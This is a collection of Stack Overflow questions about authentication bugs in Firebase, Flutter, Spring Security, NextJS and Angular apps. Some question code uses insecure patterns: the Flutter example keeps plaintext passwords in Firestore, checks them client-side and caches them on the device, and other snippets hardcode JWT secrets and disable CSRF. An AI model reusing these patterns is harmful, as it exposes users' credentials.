                                new AuthUI.IdpConfig.FacebookBuilder().build(),
                                new AuthUI.IdpConfig.EmailBuilder().build(),
                                new AuthUI.IdpConfig.GoogleBuilder().build()
                        ))
                        .build(),
                RC_SIGN_IN);
    }
}

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode==RC_SIGN_IN){
        if(resultCode==RESULT_OK){
            //users logged in
            Log.d(&quot;AUTH&quot;, auth.getCurrentUser().getEmail());
            Intent intent = new Intent(getApplicationContext(),MainActivity.class);
            startActivity(intent);
        }else{
            // users not authenticated
            Log.d(&quot;AUTH&quot;, &quot;NOT AUTHENTİCATED&quot;);
        }
    }
}
</code></pre>
<p>After a bit research i found out that startactivtyforresult is depreceated, is it the reason for this to happen or something else?. if it is what is the correct way to fix this with registerForActivityResult method?</p>
<p>Thanks in advance</p>
"
"<p>I am trying to go through spring security 6 and set up oauth2. To get a token i am trying to use the <code>client_secret_jwt</code> authentication mechanism for client.
But after a lot of tries I have been unable to do so.</p>
<p>This is my code for registering client:</p>
<pre><code>@Bean
public RegisteredClientRepository registeredClientRepository() {
    RegisteredClient registeredClient =
            RegisteredClient
                    .withId(UUID.randomUUID().toString())
                    .clientId(&quot;client&quot;)
                    .clientSecret(&quot;secret_secret_secret_secret_secret&quot;)//.tokenSettings()
                    .clientAuthenticationMethod(
                            ClientAuthenticationMethod.CLIENT_SECRET_JWT)
                    .clientSettings(ClientSettings.builder()
                            .tokenEndpointAuthenticationSigningAlgorithm(SignatureAlgorithm.RS256)
                            .jwkSetUrl(&quot;http://localhost:8080/oauth2/jwks&quot;)
                            .build())
                    .authorizationGrantType(
                            AuthorizationGrantType.CLIENT_CREDENTIALS)
                    .redirectUri(&quot;https://www.manning.com/authorized&quot;)
                    //.clientSettings(ClientSettings.builder().build())
                    .scope(&quot;CUSTOM&quot;)
                    .build();

    return new InMemoryRegisteredClientRepository(registeredClient);
}
</code></pre>
<p>This is my code for generating a jwt token signed using the secret key defined above.</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
    public JWKSource&lt;SecurityContext&gt; jwkSource()
            throws NoSuchAlgorithmException {

        /* A different method */

        JWKSet jwkSet = new JWKSet(rsaKey);
        try {
            //printing a token at startup
            String assertion = getJWTToken(&quot;client&quot;);
            logger.info(&quot;Created assertion: &quot;+assertion);
        } catch (Exception e) {
            logger.info(&quot;Error creating assertion: &quot;+e.getLocalizedMessage());
            e.printStackTrace();
        }

        return new ImmutableJWKSet&lt;&gt;(jwkSet);
    }

    private String getJWTToken(String username) {
        //using the secret key
        String secretKey = &quot;secret_secret_secret_secret_secret&quot;;

        String token = Jwts.builder()
                .subject(username)
                .issuer(username)
                .id(UUID.randomUUID().toString())
                .audience().add(&quot;http://localhost:8080/oauth2/token&quot;).and()
                .issuedAt(new Date(System.currentTimeMillis()))
                .expiration(new Date(System.currentTimeMillis() + 600*1000))
                .signWith(Keys.hmacShaKeyFor(secretKey.getBytes(StandardCharsets.UTF_8))).compact();

        return token;
    }



</code></pre>
<p>I am using the assertion printed at the start to call the token api, but have been unable to acquire a token after trying a gazillion variations.</p>
<p>This is the curl call i think is the one i am supposed to use</p>
<pre class=""lang-bash prettyprint-override""><code>curl -X POST -v\
  -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
  -d &quot;grant_type=client_credentials&amp;client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&amp;client_assertion=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJpc3MiOiJjbGllbnQiLCJqdGkiOiIxMjI0NmM4ZC0xZmIxLTRkM2UtODI2NC05OWRhNmYzNTA1NGIiLCJhdWQiOlsiaHR0cDovL2xvY2FsaG9zdDo4MDgwL29hdXRoMi90b2tlbiJdLCJpYXQiOjE3MDc2MzM0ODcsImV4cCI6MTcwNzYzNDA4N30.eYk7T67ue4KrqZqf3Rk06HqwEPRRXpYGSzkbWXtv7zo&quot; \
  http://localhost:8080/oauth2/token


</code></pre>
<p>This is the response i keep getting</p>
<pre class=""lang-bash prettyprint-override""><code>*   Trying [::1]:8080...
* Connected to localhost (::1) port 8080
&gt; POST /oauth2/token HTTP/1.1
&gt; Host: localhost:8080
&gt; User-Agent: curl/8.4.0
&gt; Accept: */*
&gt; Content-Type: application/x-www-form-urlencoded
&gt; Content-Length: 406
&gt;
&lt; HTTP/1.1 400
&lt; Vary: Origin
&lt; Vary: Access-Control-Request-Method
&lt; Vary: Access-Control-Request-Headers
&lt; X-Content-Type-Options: nosniff
&lt; X-XSS-Protection: 0
&lt; Cache-Control: no-cache, no-store, max-age=0, must-revalidate
&lt; Pragma: no-cache
&lt; Expires: 0
&lt; X-Frame-Options: DENY
&lt; Content-Type: application/json;charset=UTF-8
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 11 Feb 2024 06:39:31 GMT
&lt; Connection: close
&lt;
{&quot;error&quot;:&quot;invalid_request&quot;}* Closing connection
</code></pre>
<p>I am not sure what i am missing or doing wrong. Have not been able to find any example on the internet.</p>
<p>I have been able to get the credentials using both basic and post secret methods.</p>
<p>Edit---
Dug some more and found that there is an exception while client authentication</p>
<pre><code>Caused by: com.nimbusds.jose.proc.BadJOSEException: Signed JWT rejected: Another algorithm expected, or no matching key(s) found
    at com.nimbusds.jwt.proc.DefaultJWTProcessor.process(DefaultJWTProcessor.java:357) ~[nimbus-jose-jwt-9.37.3.jar:9.37.3]
    at com.nimbusds.jwt.proc.DefaultJWTProcessor.process(DefaultJWTProcessor.java:303) ~[nimbus-jose-jwt-9.37.3.jar:9.37.3]
    at org.springframework.security.oauth2.jwt.NimbusJwtDecoder.createJwt(NimbusJwtDecoder.java:158) ~[spring-security-oauth2-jose-6.2.1.jar:6.2.1]
    ... 126 common frames omitted
</code></pre>
<p>I am definitely missing some configurations.</p>
"
"<p>I have spring config, where i am saving spring session in redis.</p>
<pre><code>@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http
            .csrf().disable()
            .cors(Customizer.withDefaults())
            .authorizeHttpRequests(auth -&gt; {
                auth.requestMatchers(&quot;/api/v1/auth/register/**&quot;, &quot;/api/v1/auth/login&quot; , &quot;/api/v1/profile/**&quot;).permitAll();
                auth.requestMatchers(&quot;/api/v1/profile&quot;).authenticated();
                auth.anyRequest().authenticated();
            })
            .sessionManagement(sessionManagement -&gt; sessionManagement
                    .sessionCreationPolicy(IF_REQUIRED) //
                    .sessionFixation(SessionManagementConfigurer.SessionFixationConfigurer::newSession) //
                    .maximumSessions(1) //
                    .sessionRegistry(sessionRegistry())
            )
            //.exceptionHandling((ex) -&gt; ex.authenticationEntryPoint(this.authEntryPoint))
            .logout(out -&gt; out
                    .logoutUrl(&quot;/api/v1/auth/logout&quot;)
                    .invalidateHttpSession(true) // Invalidate all sessions after logout
                    .deleteCookies(&quot;JSESSIONID&quot;)
                    .addLogoutHandler(new CustomLogoutHandler(this.redisIndexedSessionRepository))
                    .logoutSuccessHandler((request, response, authentication) -&gt;
                            SecurityContextHolder.clearContext()
                    )
            )
            .build();
}
</code></pre>
<p>I want <code>&quot;/api/v1/auth/profile/**&quot;</code> route to be accessible for anyone, without authentication, however i want <code>&quot;/api/v1/auth/profile&quot;</code> to be accessible only for authenticated users.</p>
<p>Using this config, however i am able to still access /api/v1/auth/profile` authenticated, what i have noticed, that if i use</p>
<pre><code>SecurityContext context = SecurityContextHolder.getContext();
Authentication authentication = context.getAuthentication();
authentication.getPrincipal();
</code></pre>
<p>The <code>authentication.isAuthenticated()</code> results in true and <code>authentication.getPrincipal()</code> returns &quot;anonymousUser&quot; , could that be the reason why it passes to the route even tho authentication is required?</p>
<p>Thanks for help</p>
"
"<p>Following is the Code of Signup:</p>
<pre><code>import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

import 'loginscreen.dart';

class SignupScreen extends StatefulWidget {
  const SignupScreen({Key? key}) : super(key: key);

  @override
  _SignupScreenState createState() =&gt; _SignupScreenState();
}

class _SignupScreenState extends State&lt;SignupScreen&gt; {
  TextEditingController idController = TextEditingController();
  TextEditingController passController = TextEditingController();

  double screenHeight = 0;
  double screenWidth = 0;

  Color primary = const Color(0xffeef444c);

  @override
  Widget build(BuildContext context) {
    screenWidth = MediaQuery.of(context).size.width;
    screenHeight = MediaQuery.of(context).size.height;

    return Scaffold(
      resizeToAvoidBottomInset: false,
      body: SingleChildScrollView(
        child: Column(
          children: [
            Container(
              height: screenHeight / 2.5,
              width: screenWidth,
              decoration: BoxDecoration(
                color: primary,
                borderRadius: const BorderRadius.only(
                  bottomRight: Radius.circular(70),
                ),
              ),
              child: Center(
                child: Icon(
                  Icons.person_add,
                  color: Colors.white,
                  size: screenWidth / 5,
                ),
              ),
            ),
            Container(
              margin: EdgeInsets.only(
                top: screenHeight / 15,
                bottom: screenHeight / 20,
              ),
              child: Text(
                &quot;Sign Up&quot;,
                style: TextStyle(
                  fontSize: screenWidth / 20,
                  fontFamily: &quot;NexaBold&quot;,
                ),
              ),
            ),
            Container(
              alignment: Alignment.centerLeft,
              margin: EdgeInsets.symmetric(horizontal: screenWidth / 12),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  customTitle(&quot;Personal ID&quot;),
                  customInputField(
                    &quot;Enter your Personal ID&quot;,
                    idController,
                    false,
                  ),
                  customTitle(&quot;Password&quot;),
                  customInputField(
                    &quot;Enter your Password&quot;,
                    passController,
                    true,
                  ),
                  GestureDetector(
                    onTap: () async {
                      String id = idController.text.trim();
                      String password = passController.text.trim();

                      if (id.isEmpty) {
                        _showSnackbar(&quot;ID is empty&quot;);
                      } else if (password.isEmpty) {
                        _showSnackbar(&quot;Password is empty&quot;);
                      } else {
                        try {
                          await FirebaseFirestore.instance
                              .collection(&quot;person&quot;)
                              .doc(id)
                              .set({
                            'id': id,
                            'password': password,
                          });

                          _showSnackbar(&quot;Signup Successful&quot;);
                          // Navigate to Login page after signup
                          Navigator.pushReplacement(
                            context,
                            MaterialPageRoute(
                              builder: (context) =&gt; LoginScreen(),
                            ),
                          );
                        } catch (e) {
                          _showSnackbar(&quot;Error: $e&quot;);
                        }
                      }
                    },
                    child: Container(
                      height: 60,
                      width: screenWidth,
                      margin: EdgeInsets.only(top: screenHeight / 40),
                      decoration: BoxDecoration(
                        color: primary,
                        borderRadius: BorderRadius.all(Radius.circular(30)),
                      ),
                      child: Center(
                        child: Text(
                          &quot;SIGN UP&quot;,
                          style: TextStyle(
                            fontFamily: &quot;NexaBold&quot;,
                            fontSize: 17,
                            color: Colors.white,
                            letterSpacing: 2,
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showSnackbar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(message),
    ));
  }

  Widget customTitle(String title) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      child: Text(
        title,
        style: TextStyle(
          fontSize: screenWidth / 26,
          fontFamily: &quot;NexaBold&quot;,
        ),
      ),
    );
  }

  Widget customInputField(
      String hint, TextEditingController controller, bool obscure) {
    return Container(
      width: screenWidth,
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.all(Radius.circular(12)),
        boxShadow: [
          BoxShadow(
            color: Colors.black26,
            blurRadius: 10,
            offset: Offset(2, 2),
          )
        ],
      ),
      child: Row(
        children: [
          SizedBox(
            width: screenWidth / 8,
            child: Icon(
              Icons.person,
              color: primary,
              size: screenWidth / 15,
            ),
          ),
          Expanded(
            child: Padding(
              padding: EdgeInsets.only(right: screenWidth / 12),
              child: TextFormField(
                controller: controller,
                enableSuggestions: false,
                autocorrect: false,
                decoration: InputDecoration(
                  contentPadding: EdgeInsets.symmetric(
                    vertical: screenHeight / 35,
                  ),
                  border: InputBorder.none,
                  hintText: hint,
                ),
                maxLines: 1,
                obscureText: obscure,
              ),
            ),
          )
        ],
      ),
    );
  }
}

</code></pre>
<p>Following is The Code for loginScreen:</p>
<pre><code>import 'package:app/homescreen.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:flutter_keyboard_visibility/flutter_keyboard_visibility.dart';
import 'package:shared_preferences/shared_preferences.dart';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State&lt;LoginScreen&gt; createState() =&gt; _LoginScreenState();
}

class _LoginScreenState extends State&lt;LoginScreen&gt; {
  TextEditingController idController = TextEditingController();
  TextEditingController passController = TextEditingController();

  double screenHeight = 0;
  double screenWidth = 0;

  Color primary = const Color(0xffeef444c);
  late SharedPreferences sharedpref;

  @override
  Widget build(BuildContext context) {
    final bool isKeyboardVisible =
        KeyboardVisibilityProvider.isKeyboardVisible(context);
    screenWidth = MediaQuery.of(context).size.width;
    screenHeight = MediaQuery.of(context).size.height;

    return Scaffold(
      resizeToAvoidBottomInset: false,
      body: Column(
        children: [
          isKeyboardVisible
              ? SizedBox(
                  height: screenHeight / 16,
                )
              : Container(
                  height: screenHeight / 2.5,
                  width: screenWidth,
                  decoration: BoxDecoration(
                    color: primary,
                    borderRadius: const BorderRadius.only(
                      bottomRight: Radius.circular(70),
                    ),
                  ),
                  child: Center(
                    child: Icon(
                      Icons.person,
                      color: Colors.white,
                      size: screenWidth / 5,
                    ),
                  ),
                ),
          Container(
            margin: EdgeInsets.only(
              top: screenHeight / 15,
              bottom: screenHeight / 20,
            ),
            child: Text(
              &quot;Login&quot;,
              style:
                  TextStyle(fontSize: screenWidth / 20, fontFamily: &quot;NexaBold&quot;),
            ),
          ),
          Container(
            alignment: Alignment.centerLeft,
            margin: EdgeInsets.symmetric(horizontal: screenWidth / 12),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                custom_Title(&quot;Personal ID&quot;),
                custom_input_field(
                    &quot;Enter your Personal ID&quot;, idController, false),
                custom_Title(&quot;Password&quot;),
                custom_input_field(&quot;Enter your Password&quot;, passController, true),
                GestureDetector(
                  onTap: () async {
                    FocusScope.of(context).unfocus();
                    String id = idController.text.trim();
                    String password = passController.text.trim();

                    if (id.isEmpty) {
                      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
                        content: Text(&quot;Id is Still Empty&quot;),
                      ));
                    } else if (password.isEmpty) {
                      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
                        content: Text(&quot;Password is Still Empty&quot;),
                      ));
                    } else {
                      QuerySnapshot snap = await FirebaseFirestore.instance
                          .collection(&quot;person&quot;)
                          .where('id', isEqualTo: id)
                          .get();
                      try {
                        if (password == snap.docs[0]['password']) {
                          sharedpref = await SharedPreferences.getInstance();

                          sharedpref.setString(&quot;personID&quot;, id).then((_) {
                            Navigator.pushReplacement(
                                context,
                                MaterialPageRoute(
                                    builder: (context) =&gt; HomeScreen()));
                          });
                          sharedpref.setString(&quot;personPass&quot;, password);
                        } else {
                          ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                            content: Text(&quot;password incorrect&quot;),
                          ));
                        }
                      } catch (e) {
                        String error = &quot; &quot;;
                        if (e.toString() ==
                            &quot;RangeError (index): Invalid value: Valid value range is empty: 0&quot;) {
                          setState(() {
                            error = &quot;Person id does not exist&quot;;
                          });
                        } else {
                          setState(() {
                            error = &quot;Error Occured!&quot;;
                          });
                        }
                        ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                          content: Text(error),
                        ));
                      }
                    }
                  },
                  child: Container(
                    height: 60,
                    width: screenWidth,
                    margin: EdgeInsets.only(top: screenHeight / 40),
                    decoration: BoxDecoration(
                      color: primary,
                      borderRadius: const BorderRadius.all(Radius.circular(30)),
                    ),
                    child: const Center(
                      child: Text(
                        &quot;LOGIN&quot;,
                        style: TextStyle(
                          fontFamily: &quot;NexaBold&quot;,
                          fontSize: 17,
                          color: Colors.white,
                          letterSpacing: 2,
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget custom_Title(String title) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      child: Text(
        title,
        style: TextStyle(fontSize: screenWidth / 26, fontFamily: &quot;NexaBold&quot;),
      ),
    );
  }

  Widget custom_input_field(
      String hint, TextEditingController controller, bool obscure) {
    return Container(
      width: screenWidth,
      margin: const EdgeInsets.only(bottom: 12),
      decoration: const BoxDecoration(
          color: Colors.white,
          borderRadius: BorderRadius.all(Radius.circular(12)),
          boxShadow: [
            BoxShadow(
                color: Colors.black26, blurRadius: 10, offset: Offset(2, 2))
          ]),
      child: Row(
        children: [
          SizedBox(
            width: screenWidth / 8,
            child: Icon(
              Icons.person,
              color: primary,
              size: screenWidth / 15,
            ),
          ),
          Expanded(
            child: Padding(
              padding: EdgeInsets.only(right: screenWidth / 12),
              child: TextFormField(
                controller: controller,
                enableSuggestions: false,
                autocorrect: false,
                decoration: InputDecoration(
                  contentPadding: EdgeInsets.symmetric(
                    vertical: screenHeight / 35,
                  ),
                  border: InputBorder.none,
                  hintText: hint,
                ),
                maxLines: 1,
                obscureText: obscure,
              ),
            ),
          )
        ],
      ),
    );
  }
}


</code></pre>
<p>Now In The SignupScreen, In the following lines :</p>
<pre><code> Navigator.pushReplacement(
                            context,
                            MaterialPageRoute(
                              builder: (context) =&gt; LoginScreen(),
                            ),
                          );
</code></pre>
<p>I'm getting error of:</p>
<blockquote>
<p>══╡ EXCEPTION CAUGHT BY WIDGETS LIBRARY
╞═══════════════════════════════════════════════════════════<br />
The following TypeErrorImpl was thrown building LoginScreen(dirty, state:<br />
_LoginScreenState#26f54): Unexpected null value.\</p>
<p>The relevant error-causing widget was:<br />
LoginScreen<br />
LoginScreen:file:///D:/attendance%20system/app/lib/signupscreen.dart:104:53</p>
<p>When the exception was thrown, this was the stack:<br />
dart-sdk/lib/<em>internal/js_dev_runtime/private/ddc_runtime/errors.dart 294:3<br />
throw</em>
dart-sdk/lib/_internal/js_dev_runtime/private/ddc_runtime/operations.dart 943:18<br />
nullCheck
packages/flutter_keyboard_visibility/src/ui/keyboard_visibility_provider.dart 55:10 <br />
isKeyboardVisible
packages/app/loginscreen.dart 27:36<br />
build
packages/flutter/src/widgets/f</p>
</blockquote>
"
"<p>No matter what I try every try to run this flutter firebase exception it keeps running just the first message like it is not getting error codes, which I put in the 'try' but 'firebaseauthexception' catch doesn't run even tho I put wrong inputs.</p>
<pre><code>Future passwordReset() async {
try{
  await FirebaseAuth.instance.sendPasswordResetEmail(email: emailController.text.trim());
  ScaffoldMessenger.of(context).showSnackBar(
    const SnackBar(
      content: Text('Password reset link has been sent to your email!'),
    ),
  );
} on FirebaseAuthException catch(e) {
  ScaffoldMessenger.of(context).showSnackBar(
    const SnackBar(
      content: Text('Incorrect Email or Password'),
    ),
  );
}
</code></pre>
<p>}</p>
<p>I tries different methods with showDialog and showSnackBar still getting the same output.</p>
"
"<p>Im creating an application with nextJS and I need to know how if a user is logged in and tries to access the same account on another device, automatically logout on the first device where he is logged in.</p>
<p>I am handling the authentication with Redux.</p>
<p>I manage the users with firestore and they have a field called isAuthenticated that is set to true or false when the user logs in/logout.</p>
"
"<p>In Flutter I was trying this codelab by Google: <a href=""https://firebase.google.com/codelabs/firebase-auth-in-flutter-apps#3"" rel=""nofollow noreferrer"">link</a></p>
<p>When I import these two files in my code:</p>
<pre><code>import 'package:firebase_ui_auth/firebase_ui_auth.dart';
import 'package:firebase_auth/firebase_auth.dart' hide EmailAuthProvider;
</code></pre>
<p>I don't even use anything from the imports as of yet.
I get the following error on compilation:</p>
<pre class=""lang-none prettyprint-override""><code>../../.pub-cache/hosted/pub.dev/firebase_ui_auth-1.10.0/lib/src/screens/profile_screen.dart:215:25: Error: The method 'showAdaptiveDialog' isn't defined for the class '_LinkedProvidersRowState'.
 - '_LinkedProvidersRowState' is from 'package:firebase_ui_auth/src/screens/profile_screen.dart' ('../../.pub-cache/hosted/pub.dev/firebase_ui_auth-1.10.0/lib/src/screens/profile_screen.dart').
Try correcting the name to the name of an existing method, or defining a method named 'showAdaptiveDialog'.
      confirmed = await showAdaptiveDialog&lt;bool?&gt;(
                        ^^^^^^^^^^^^^^^^^^
Failed to compile application.

</code></pre>
<p>Could you kindly help?</p>
<p>I tried running it with the import &amp; without the import. The error occurs only during the import.</p>
"
"<p>I have looked at other sources and I still am not getting the answer. I'm not sure how to begin a try/catch block with what I have. There have been moments where it worked without one, I keep coming back to the same error though.
I have altered little parts of it as I have seen suggested on Stack Overflow and other sources but I am still coming up with the error,</p>
<blockquote>
<p>Exception has occurred.
ArgumentError (Invalid argument(s) (onError): The error handler of Future.catchError must return a value of the future's type)&quot;</p>
</blockquote>
<p>There are two alterations commented out because, they worked for either a time or two then stopped.</p>
<p>The error happens right at the <code>await fAuth</code>:</p>
<pre><code>signInUser() async {
  showDialog(
      barrierDismissible: false,
      context: context,
      builder: (BuildContext context) =&gt;
          const LoadingDialog(messageText: &quot;Logging in...&quot;));

  final User? userFirebase = (await fAuth
          .signInWithEmailAndPassword(
              email: emailTextEditingController.text.trim(),
              password: passwordTextEditingController.text.trim())
          .catchError((errorMsg) {
    Navigator.pop(context);
    // Fluttertoast.showToast(msg: &quot;Error ${errorMsg.toString()}&quot;);

   return cMethods.displaySnackBar(errorMsg.toString(), context);
    // return errorMsg;
  }))
      .user;
  if (!context.mounted) return;
  Navigator.pop(context);```
</code></pre>
<p>From the global file,</p>
<pre><code>final FirebaseAuth fAuth = FirebaseAuth.instance;

User? currentFirebaseUser;
</code></pre>
"
"<p>I would like to create a custom token from my fastify server.</p>
<p>Now, I am reading the following, exceptionally poor, guide:
<a href=""https://firebase.google.com/docs/auth/admin/create-custom-tokens"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/auth/admin/create-custom-tokens</a></p>
<p>They have this (incomplete in my opinion) example:</p>
<pre><code>const uid = 'some-uid';

getAuth()
  .createCustomToken(uid)
  .then((customToken) =&gt; {
    // Send token back to client
  })
  .catch((error) =&gt; {
    console.log('Error creating custom token:', error);
  });
</code></pre>
<p>The first thing I do not understand is where the method getAuth() comes from. There is zero explanation in the official documentation.
My guess would be that it comes from the firebase-admin. However I do not understand how to use it.</p>
<p>The second non-sense thing, related to the above is when I created a project in firebase console I got the following:</p>
<pre><code>// Import the functions you need from the SDKs you need
import { initializeApp } from &quot;firebase/app&quot;;
import { getAnalytics } from &quot;firebase/analytics&quot;;
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: &quot;api_key&quot;,
  authDomain: &quot;xyz&quot;,
  projectId: &quot;xyz&quot;,
  storageBucket: &quot;xyz&quot;,
  messagingSenderId: &quot;000&quot;,
  appId: &quot;0xyz&quot;,
  measurementId: &quot;xyz0&quot;
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
</code></pre>
<p>However I do not understand how to use it in the firebase-admin.</p>
<p>Even if I do the following:</p>
<pre><code>const admin = require('firebase-admin');
admin.initializeApp(firebaseConfig);
</code></pre>
<p>I get the message:</p>
<blockquote>
<p>errorInfo: {
code: 'auth/invalid-credential',
message: 'Failed to determine service account. Make sure to initialize the SDK with a service account credential. Alternatively
specify a service account with iam.serviceAccounts.signBlob
permission. Original error: Error: Error while making request:
getaddrinfo ENOTFOUND metadata. Error code: ENOTFOUND'   },<br />
codePrefix: 'auth'</p>
</blockquote>
<p>Any help would be much appreciated as I have wasted a lot of time due to the incompleteness of the firebase documentation.</p>
"
"<p>I am creating an OTP verification app using Firebase Authentication with a phone number. I did all the stuff like add dependencies,pugin, JSON file, and connect Firebase Authentication but still have this error. please tell me what should i do.</p>
<pre><code>public class MainActivity extends AppCompatActivity {

    EditText editMobileNumber;
    Button sendButton;
    FirebaseAuth mAuth;
    PhoneAuthProvider.OnVerificationStateChangedCallbacks mCallbacks;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mAuth=FirebaseAuth.getInstance();

        editMobileNumber=findViewById(R.id.editMobileNumber);
        sendButton=findViewById(R.id.getOTP);

        sendButton.setOnClickListener(v -&gt; {
            String number=editMobileNumber.getText().toString().trim();
            if(number.length() != 10){

                Toast.makeText(this,&quot;Enter a valid number&quot;,Toast.LENGTH_SHORT).show();
            }
            else{
                    otpSend(number);
            }
        }
        );

    }

    private void otpSend(String number) {
        mCallbacks = new PhoneAuthProvider.OnVerificationStateChangedCallbacks() {

            @Override
            public void onVerificationCompleted(@NonNull PhoneAuthCredential credential) {

            }

            @Override
            public void onVerificationFailed(@NonNull FirebaseException e) {

                Toast.makeText(MainActivity.this,number,Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onCodeSent(@NonNull String verificationId,
                                   @NonNull PhoneAuthProvider.ForceResendingToken token) {

                Toast.makeText(MainActivity.this,verificationId,Toast.LENGTH_SHORT).show();
                Intent i=new Intent(MainActivity.this, verifyOTP.class);
                i.putExtra(&quot;verificationId&quot;,verificationId);
                startActivity(i);
                finish();
            }
        };

        PhoneAuthOptions options =
                PhoneAuthOptions.newBuilder(mAuth)
                        .setPhoneNumber(&quot;+91&quot; + number)       // Phone number for Otp
                        .setTimeout(60L, TimeUnit.SECONDS) // Timeout and unit
                        .setActivity(this)
                        .setCallbacks(mCallbacks)          // OnVerificationStateChangedCallbacks
                        .build();

        PhoneAuthProvider.verifyPhoneNumber(options);

    }


}

</code></pre>
<p>verification is on next activity. here is the code :-</p>
<pre><code>public class verifyOTP extends AppCompatActivity {

PinView otpPinView;
Button resendOTPButton,verifyButton;
TextView textView;
String verificationId= getIntent().getStringExtra(&quot;verificationId&quot;),otp;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_verify_otp);

    otpPinView=findViewById(R.id.otppinview);
    resendOTPButton=findViewById(R.id.resendOTPButton);
    verifyButton=findViewById(R.id.verifyButton);
    textView=findViewById(R.id.verifyOTP);



    textView.setOnClickListener(v -&gt; {
        Toast.makeText(this,&quot;it works&quot;,Toast.LENGTH_SHORT).show();
    });


    verifyButton.setOnClickListener(v -&gt;{
        otp= Objects.requireNonNull(otpPinView.getText()).toString();

        if(otp.length() != 6){
            Toast.makeText(this,&quot;Invalid OTP!!&quot;,Toast.LENGTH_SHORT).show();
        }
        else{
            if(verificationId != null){
                PhoneAuthCredential credential = PhoneAuthProvider.getCredential(verificationId, otp);

                FirebaseAuth.getInstance().signInWithCredential(credential)
                        .addOnCompleteListener(this, task -&gt; {
                            if (task.isSuccessful()) {
                                // If Sign in success


                            } else {
                                // If sign in failed
                                Toast.makeText(this,&quot;Invalid OTP!!&quot;,Toast.LENGTH_SHORT).show();
                            }
                        });

            }
        }

    });


}
</code></pre>
<p>}</p>
<p>the logcat show error is:-</p>
<ol>
<li><p>Failed to initialize reCAPTCHA config: No Recaptcha Enterprise siteKey configured for tenant/project *</p>
</li>
<li><p>FATAL EXCEPTION: main                                                                                 java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.example.vivetales/com.example.vivetales.verifyOTP}: java.lang.NullPointerException: Attempt to invoke virtual method 'java.lang.String android.content.Intent.getStringExtra(java.lang.String)' on a null object reference</p>
</li>
</ol>
"
"<p>I'm using Angular and Spring Boot.</p>
<p>When the user logs into the website, my backend with Spring Security creates a session and stores it in the Redis database. This session is a cookie <strong>SESSION</strong> sent in each request from the backend to the frontend and vice versa. (For more information: <a href=""https://redis.com/blog/json-web-tokens-jwt-are-dangerous-for-user-sessions/"" rel=""nofollow noreferrer"">https://redis.com/blog/json-web-tokens-jwt-are-dangerous-for-user-sessions/</a>)</p>
<p>I want to know if, to control access to some frontend functionality, for example, whether the user can see a link or not depending on whether they are logged in, I should do a simple Redis query to compare the session ID or if I should create a cookie that says the user is authenticated.</p>
<p>Note: I can't use the <strong>SESSION</strong> cookie because it is HttpOnly = true.</p>
<p>I'm learning web development, so if you could explain it to me, I'd be very grateful.</p>
<p>I ask this because I believe that querying Redis every time I want to render something on the frontend can overload the system, but I don't know if this is the most used alternative.</p>
<p>Using Redis it would look like this:</p>
<h3>Backend AuthService:</h3>
<pre><code>    public boolean isAuthenticated(HttpServletRequest request) {

        HttpSession httpSession = request.getSession(false);
        if (httpSession == null) {
            return false;
        }

        String sessionId = httpSession.getId();

        String username = getUsername();

        if (username == null) {
            return false;
        }

        return redisIndexedSessionRepository.findByPrincipalName(username).keySet().stream()
                .anyMatch(sessionId::equals);
    }
</code></pre>
<h3>Backend AuthController:</h3>
<pre><code>    @PostMapping(&quot;/public/authentication/check-session&quot;)
    public boolean checkSession(HttpServletRequest request) {
        return authService.isAuthenticated(request);
    }
</code></pre>
<h3>Frontend AuthService:</h3>
<pre><code>
  isAuthenticated(): Observable&lt;boolean&gt; {
    return this.httpClient.post&lt;boolean&gt;(`${this.url}/public/authentication/check-session`, null);
  }

</code></pre>
"
"<p>Our system is comprises of:</p>
<ol>
<li>NextJS Front End</li>
<li>NextJS Back End</li>
<li>Java Spring Boot SSO using Apereo CAS.</li>
</ol>
<p>We would like to integrate our current system to use Apereo CAS for our new SSO.
The project mostly consist on SSO logins only and will not be related to any other module on the current system.</p>
<p>NextJS + Java Spring Boot Developer For Library System
Our system is comprises of:</p>
<ol>
<li>NextJS Front End</li>
<li>NextJS Back End</li>
<li>Java Spring Boot SSO using Apereo CAS.</li>
</ol>
"
"<p>I have a demo application consisting of one form (dashboard.xhtml) which allows user to select a file and then add a row to a table. To do this, it has two Primefaces File upload buttons, the first uses simple mode to load files, the second uses advanced mode.</p>
